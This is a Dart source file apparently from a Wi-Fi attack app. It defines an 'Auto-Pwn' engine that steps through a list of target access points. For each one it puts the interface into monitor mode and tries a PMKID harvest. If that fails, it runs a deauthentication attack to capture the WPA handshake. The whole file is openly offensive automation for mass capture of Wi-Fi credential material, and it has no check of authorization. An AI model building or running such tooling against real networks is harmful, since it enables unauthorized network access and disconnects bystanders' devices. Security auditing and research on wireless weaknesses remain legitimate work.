// domain/usecases/execute_auto_pwn.dart
import 'dart:async';
import '../entities/access_point.dart';
import '../repositories/wifi_repository.dart';
import 'execute_pmkid_attack.dart';
import 'execute_deauth.dart';

enum AutoPwnPhase {
  scanning,
  targeting,
  pmkidHarvest,
  deauthCapture,
  completed,
}

class AutoPwnProgress {
  final AutoPwnPhase phase;
  final AccessPoint? currentTarget;
  final int completedTargets;
  final int totalTargets;
  final String statusLog;

  AutoPwnProgress({
    required this.phase,
    this.currentTarget,
    required this.completedTargets,
    required this.totalTargets,
    required this.statusLog,
  });
}

/// Automated Auto-Pwn Campaign Engine Use Case.
/// Automatically steps through discovered APs, running PMKID harvests & Handshake captures sequentially.
class ExecuteAutoPwn {
  final WifiRepository repository;
  final ExecutePmkidAttack pmkidAttack;
  final ExecuteDeauth deauthAttack;

  ExecuteAutoPwn(this.repository)
      : pmkidAttack = ExecutePmkidAttack(repository),
        deauthAttack = ExecuteDeauth(repository);

  Stream<AutoPwnProgress> runCampaign(List<AccessPoint> targets) async* {
    if (targets.isEmpty) {
      yield AutoPwnProgress(
        phase: AutoPwnPhase.completed,
        completedTargets: 0,
        totalTargets: 0,
        statusLog: 'No target Access Points provided for campaign.',
      );
      return;
    }

    int completed = 0;
    final total = targets.length;

    yield AutoPwnProgress(
      phase: AutoPwnPhase.scanning,
      completedTargets: 0,
      totalTargets: total,
      statusLog: 'Starting Auto-Pwn Campaign on $total targets...',
    );

    for (final target in targets) {
      yield AutoPwnProgress(
        phase: AutoPwnPhase.targeting,
        currentTarget: target,
        completedTargets: completed,
        totalTargets: total,
        statusLog: 'Tuning interface to Channel ${target.channel} for [${target.displaySsid}]...',
      );

      await repository.startMonitorMode(target.channel);
      await repository.startCapture();

      // Phase 1: Attempt PMKID harvest
      yield AutoPwnProgress(
        phase: AutoPwnPhase.pmkidHarvest,
        currentTarget: target,
        completedTargets: completed,
        totalTargets: total,
        statusLog: 'Attempting PMKID harvest against ${target.bssid}...',
      );

      final pmkidResult = await pmkidAttack(target);
      if (pmkidResult.success) {
        yield AutoPwnProgress(
          phase: AutoPwnPhase.pmkidHarvest,
          currentTarget: target,
          completedTargets: completed,
          totalTargets: total,
          statusLog: '✓ SUCCESS: PMKID Captured for ${target.displaySsid}!',
        );
      } else {
        // Phase 2: Deauth attack for Handshake if PMKID failed
        yield AutoPwnProgress(
          phase: AutoPwnPhase.deauthCapture,
          currentTarget: target,
          completedTargets: completed,
          totalTargets: total,
          statusLog: 'PMKID silent. Executing Deauth attack against ${target.displaySsid}...',
        );

        await deauthAttack(target, []);
        await Future.delayed(const Duration(seconds: 3));
      }

      await repository.stopCapture();
      completed++;
    }

    await repository.stopMonitorMode();

    yield AutoPwnProgress(
      phase: AutoPwnPhase.completed,
      completedTargets: completed,
      totalTargets: total,
      statusLog: 'Auto-Pwn Campaign Finished! $completed/$total targets processed.',
    );
  }
}
